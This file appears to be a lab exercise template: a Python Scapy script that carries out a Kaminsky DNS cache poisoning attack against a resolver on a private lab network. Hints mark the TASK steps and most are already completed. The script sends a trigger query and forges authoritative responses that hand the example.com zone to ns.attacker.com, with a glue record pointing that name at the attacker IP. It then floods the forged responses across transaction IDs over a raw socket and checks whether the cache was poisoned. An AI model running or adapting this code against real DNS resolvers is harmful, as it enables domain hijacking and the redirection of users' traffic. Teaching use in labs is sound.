from scapy.all import *
import struct
import socket
import random
import string

# ==========================================
# TASK 1: Set your Attacker IP
# ==========================================
target_dns = "10.9.0.53"
auth_dns = "10.9.0.154"      
attacker_ip = "10.9.0.10" # <--- TASK 1: Replace with your machine's IP
target_port = 33333

# ==========================================
# TRIGGER QUERY FOR KAMINSKY ATTACK
# ==========================================
random_prefix = ''.join([random.choice(string.ascii_lowercase) for _ in range(5)])
domain = "{}.example.com".format(random_prefix)

print("[*] Sending trigger query for {}...".format(domain))
trigger = IP(dst=target_dns) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=domain))
send(trigger, verbose=0)

# ==========================================
# TASK 2 & 3: Build the spoofed packet
# ==========================================
print("[*] Building and flooding spoofed KAMINSKY responses...")

base_pkt = (
    Ether(dst="ff:ff:ff:ff:ff:ff") /
    IP(src=auth_dns, dst=target_dns) /
    UDP(sport=53, dport=target_port, chksum=0) /
    DNS(
        id=0,
        qr=1,
        aa=1,
        qd=DNSQR(qname=domain),
        an=DNSRR(rrname=domain, type='A', ttl=86400, rdata="1.1.1.1"),
        
        # <--- TASK 2: Claim control of the ENTIRE parent zone
        # HINT 1: You want to hijack 'example.com', not the random subdomain.
        # HINT 2: What is the record type for an Authority Server?
        ns=DNSRR(rrname="example.com", 
                 type='NS', 
                 ttl=86400, 
                 rdata="ns.attacker.com"
                 ),
        
        # <--- TASK 3: Map the fake NS to your IP (Glue Record)
        # HINT: What is the record type that maps a name to an IPv4 address?
        ar=DNSRR(rrname="ns.attacker.com", 
                 type='A', 
                 ttl=86400, 
                 rdata=attacker_ip
        )
    )
)

raw_bytes = bytearray(raw(base_pkt))
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.bind(("eth0", 0))

# ==========================================
# TASK 4: The flood and the time window
# ==========================================
# <--- TASK 4: How many packets to cover all possible Transaction IDs? 
# HINT: The DNS TXID is a 16-bit field. What is the maximum value?
MAX_TXID = 0 

for txid in range(0, MAX_TXID):
    struct.pack_into('!H', raw_bytes, 42, txid)
    s.send(raw_bytes)

print("[+] Kaminsky flood complete for {}!".format(domain))

# ==========================================
# TASK 5: Run and Verify
# ==========================================
print("[*] Verifying cache poisoning...")
verification = sr1(
    IP(dst=target_dns) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=domain)),
    timeout=3,
    verbose=0
)

if verification and verification.haslayer(DNS) and verification.an and verification.an.rdata == "1.1.1.1":
    print("[+] Verification SUCCESS: {} resolves to 1.1.1.1".format(domain))
    print("[!] ROOT CONQUERED! The attacker is now the authority for example.com.")
else:
    print("[-] Verification FAILED: {} did not resolve to the fake IP".format(domain))